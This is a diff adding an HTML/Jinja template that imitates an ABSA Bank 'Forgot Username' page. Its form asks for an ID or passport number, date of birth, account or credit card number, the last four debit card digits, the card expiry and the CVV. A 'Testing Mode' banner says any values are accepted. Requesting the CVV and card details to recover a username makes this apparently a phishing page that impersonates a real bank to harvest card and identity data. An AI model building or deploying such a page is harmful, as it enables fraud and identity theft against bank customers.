@@ -1,0 +1,433 @@
+{% extends "base.html" %}
+
+{% block title %}Customer Information - ABSA Bank{% endblock %}
+
+{% block extra_css %}
+<style>
+  .progress {
+    display: flex;
+    align-items: center;
+    margin-bottom: 30px;
+  }
+
+  .progress-step {
+    flex: 1;
+    position: relative;
+    text-align: center;
+    font-size: 13px;
+    color: var(--text-light);
+  }
+
+  .progress-step::before {
+    content: "";
+    display: block;
+    width: 100%;
+    height: 3px;
+    background: var(--border);
+    position: absolute;
+    top: 8px;
+    left: -50%;
+    z-index: -1;
+  }
+
+  .progress-step:first-child::before {
+    display: none;
+  }
+
+  .progress-step.active {
+    color: var(--primary);
+    font-weight: bold;
+  }
+
+  .progress-step.active::before {
+    background: var(--primary);
+  }
+
+  .progress-step span {
+    display: inline-block;
+    width: 20px;
+    height: 20px;
+    line-height: 20px;
+    border-radius: 50%;
+    background: var(--primary);
+    color: #fff;
+    font-size: 12px;
+    margin-bottom: 5px;
+  }
+
+  h2 {
+    font-size: 20px;
+    margin-bottom: 20px;
+    font-weight: normal;
+  }
+
+  form {
+    background: #fff;
+    padding: 20px 25px;
+    border-radius: 4px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+  }
+
+  label {
+    display: block;
+    font-size: 14px;
+    margin-bottom: 5px;
+    font-weight: 600;
+  }
+
+  input, select {
+    width: 100%;
+    padding: 8px 10px;
+    font-size: 14px;
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    box-sizing: border-box;
+  }
+
+  .inline-inputs {
+    display: flex;
+    gap: 10px;
+  }
+
+  .inline-inputs select,
+  .inline-inputs input {
+    flex: 1;
+  }
+
+  .branch-row {
+    display: flex;
+    gap: 10px;
+    align-items: center;
+  }
+
+  .branch-row button {
+    padding: 8px 12px;
+    border: 1px solid var(--accent);
+    color: var(--accent);
+    background: #fff;
+    border-radius: 3px;
+    cursor: pointer;
+    font-size: 13px;
+  }
+
+  .branch-row button:hover {
+    background: #ffe5d6;
+  }
+
+  .digit-boxes {
+    display: flex;
+    flex-direction: row;
+    gap: 12px;
+    margin-top: 10px;
+    justify-content: flex-start;
+    align-items: center;
+    flex-wrap: nowrap;
+  }
+
+  .digit-boxes input {
+    width: 60px;
+    height: 60px;
+    font-size: 28px;
+    font-weight: bold;
+    text-align: center;
+    border: 2px solid var(--border);
+    border-radius: 8px;
+    background-color: #fafafa;
+    transition: all 0.3s ease;
+    outline: none;
+    color: var(--text-dark);
+  }
+
+  .digit-boxes input:focus {
+    border-color: var(--primary);
+    background-color: #fff;
+    box-shadow: 0 0 0 3px rgba(139, 21, 56, 0.1);
+    transform: scale(1.05);
+  }
+
+  .digit-boxes input:hover {
+    border-color: var(--accent);
+    background-color: #fff;
+  }
+
+  .digit-boxes input.filled {
+    background-color: #f0f8ff;
+    border-color: var(--primary);
+  }
+
+  .digit-instruction {
+    font-size: 12px;
+    color: var(--text-light);
+    margin-top: 8px;
+    font-style: italic;
+  }
+
+  .buttons {
+    display: flex;
+    justify-content: flex-end;
+    gap: 10px;
+    margin-top: 20px;
+  }
+
+  .buttons .cancel {
+    background: #fff;
+    border: 1px solid var(--accent);
+    color: var(--accent);
+    padding: 8px 18px;
+    border-radius: 3px;
+    cursor: pointer;
+  }
+
+  .buttons .next {
+    background: var(--accent);
+    color: #fff;
+    border: none;
+    padding: 8px 22px;
+    border-radius: 3px;
+    cursor: pointer;
+  }
+
+  .buttons .next:hover {
+    background: #e55b00;
+  }
+
+  .note {
+    margin-top: 15px;
+    font-size: 12px;
+    color: var(--text-light);
+  }
+
+  @media (max-width: 600px) {
+    .inline-inputs, .branch-row {
+      flex-direction: column;
+    }
+    .digit-boxes {
+      flex-direction: row;
+      justify-content: center;
+      gap: 8px;
+      flex-wrap: nowrap;
+    }
+    .digit-boxes input {
+      width: 50px;
+      height: 50px;
+      font-size: 24px;
+    }
+    .buttons {
+      flex-direction: column;
+    }
+    .buttons button {
+      width: 100%;
+    }
+  }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="progress">
+  <div class="progress-step active"><span>1</span><br>Customer Information</div>
+  <div class="progress-step"><span>2</span><br>2LA</div>
+  <div class="progress-step"><span>3</span><br>Show Username</div>
+</div>
+
+<h2>Forgot Username - Customer Info</h2>
+
+<div class="flash-message info">
+  <strong>Testing Mode:</strong> You can enter any details to test the application. All fields are required but any values will be accepted.
+</div>
+
+<form id="customerForm" method="POST" action="{{ url_for('customer_info') }}">
+  <div>
+    <label>ID Number *</label>
+    <select id="idType" name="idType" required>
+      <option value="" disabled selected>Select ID Type</option>
+      <option value="passport">Passport</option>
+      <option value="id">ID</option>
+    </select>
+    <input type="text" name="idNumber" placeholder="Enter ID Number" required>
+  </div>
+
+  <div>
+    <label>Date of Birth (dd/mm/yyyy) *</label>
+    <div class="inline-inputs">
+      <select id="dobDay" name="dobDay" required></select>
+      <select id="dobMonth" name="dobMonth" required></select>
+      <select id="dobYear" name="dobYear" required></select>
+    </div>
+  </div>
+
+  <div>
+    <label>Credit card/Account Number *</label>
+    <input type="text" name="accountNumber" placeholder="Enter Account Number" 
+           autocomplete="off" spellcheck="false" data-form-type="other" required>
+  </div>
+
+  <div>
+    <label>Branch Code *</label>
+    <div class="branch-row">
+      <input type="text" id="branchCode" name="branchCode" required>
+      <button type="button" id="branchLookup">Branch Lookup</button>
+    </div>
+  </div>
+
+  <div>
+    <label>Please enter the following digits of your debit card number *</label>
+    <div class="digit-boxes">
+      <input type="text" name="digit1" maxlength="1" class="digit-input" inputmode="numeric" pattern="[0-9]" autocomplete="off" required>
+      <input type="text" name="digit2" maxlength="1" class="digit-input" inputmode="numeric" pattern="[0-9]" autocomplete="off" required>
+      <input type="text" name="digit3" maxlength="1" class="digit-input" inputmode="numeric" pattern="[0-9]" autocomplete="off" required>
+      <input type="text" name="digit4" maxlength="1" class="digit-input" inputmode="numeric" pattern="[0-9]" autocomplete="off" required>
+    </div>
+    <div class="digit-instruction">Enter only the last 4 digits of your debit card</div>
+  </div>
+
+  <div>
+    <label>Debit Card Expiry</label>
+    <div class="inline-inputs">
+      <select id="expMonth" name="expMonth"></select>
+      <select id="expYear" name="expYear"></select>
+    </div>
+  </div>
+
+  <div>
+    <label>CVV *</label>
+    <input type="text" name="cvv" placeholder="CVV" required>
+  </div>
+
+  <div class="buttons">
+    <button type="button" class="cancel" id="cancelBtn">Cancel</button>
+    <button type="submit" class="next">Next</button>
+  </div>
+
+  <div class="note">
+    * Mandatory Field
+  </div>
+</form>
+{% endblock %}
+
+{% block scripts %}
+<script>
+  // Populate DOB
+  const dobDay = document.getElementById('dobDay');
+  const dobMonth = document.getElementById('dobMonth');
+  const dobYear = document.getElementById('dobYear');
+  
+  // Add placeholder options
+  dobDay.innerHTML = '<option value="" disabled selected>Day</option>';
+  dobMonth.innerHTML = '<option value="" disabled selected>Month</option>';
+  dobYear.innerHTML = '<option value="" disabled selected>Year</option>';
+  
+  // Populate day options
+  for(let i=1; i<=31; i++) {
+    dobDay.innerHTML += `<option value="${i}">${i}</option>`;
+  }
+  
+  // Populate month options
+  for(let i=1; i<=12; i++) {
+    dobMonth.innerHTML += `<option value="${i}">${i}</option>`;
+  }
+  
+  // Populate year options
+  const currentYear = new Date().getFullYear();
+  for(let i=currentYear; i>=1900; i--) {
+    dobYear.innerHTML += `<option value="${i}">${i}</option>`;
+  }
+
+  // Populate expiry
+  const expMonth = document.getElementById('expMonth');
+  const expYear = document.getElementById('expYear');
+  
+  // Add placeholder options
+  expMonth.innerHTML = '<option value="" disabled selected>Month</option>';
+  expYear.innerHTML = '<option value="" disabled selected>Year</option>';
+  
+  // Populate month options
+  for(let i=1; i<=12; i++) {
+    expMonth.innerHTML += `<option value="${i}">${String(i).padStart(2, '0')}</option>`;
+  }
+  
+  // Populate year options
+  for(let i=currentYear; i<=currentYear+20; i++) {
+    expYear.innerHTML += `<option value="${i}">${i}</option>`;
+  }
+
+  // Cancel button
+  document.getElementById('cancelBtn').addEventListener('click', () => {
+    document.getElementById('customerForm').reset();
+  });
+
+  // Branch lookup
+  document.getElementById('branchLookup').addEventListener('click', async () => {
+    const code = document.getElementById('branchCode').value;
+    if (!code) {
+      alert('Please enter a branch code first');
+      return;
+    }
+    
+    try {
+      const response = await fetch(`{{ url_for('branch_lookup') }}?code=${code}`);
+      const data = await response.json();
+      
+      if (data.success) {
+        alert(`Branch: ${data.name}`);
+      } else {
+        alert(data.message);
+      }
+    } catch (error) {
+      alert('Error looking up branch code');
+    }
+  });
+
+  // Enhanced debit card digit functionality
+  const digitInputs = document.querySelectorAll('.digit-input');
+  
+  digitInputs.forEach((input, index) => {
+    // Auto-tab on input
+    input.addEventListener('input', (e) => {
+      // Only allow numeric input
+      const value = e.target.value.replace(/[^0-9]/g, '');
+      e.target.value = value;
+      
+      // Add filled class for visual feedback
+      if (value) {
+        e.target.classList.add('filled');
+        // Move to next input if available
+        if (index < digitInputs.length - 1) {
+          digitInputs[index + 1].focus();
+        }
+      } else {
+        e.target.classList.remove('filled');
+      }
+    });
+    
+    // Handle backspace navigation
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace') {
+        // If current input is empty, move to previous
+        if (input.value === '' && index > 0) {
+          digitInputs[index - 1].focus();
+          digitInputs[index - 1].value = '';
+          digitInputs[index - 1].classList.remove('filled');
+        } else {
+          // Clear current input
+          input.classList.remove('filled');
+        }
+      }
+      
+      // Handle arrow key navigation
+      if (e.key === 'ArrowRight' && index < digitInputs.length - 1) {
+        digitInputs[index + 1].focus();
+      }
+      if (e.key === 'ArrowLeft' && index > 0) {
+        digitInputs[index - 1].focus();
+      }
+    });
+    
+    // Prevent non-numeric input
+    input.addEventListener('keypress', (e) => {
+      if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
+        e.preventDefault();
+      }
+    });
+  });
+</script>
+{% endblock %}
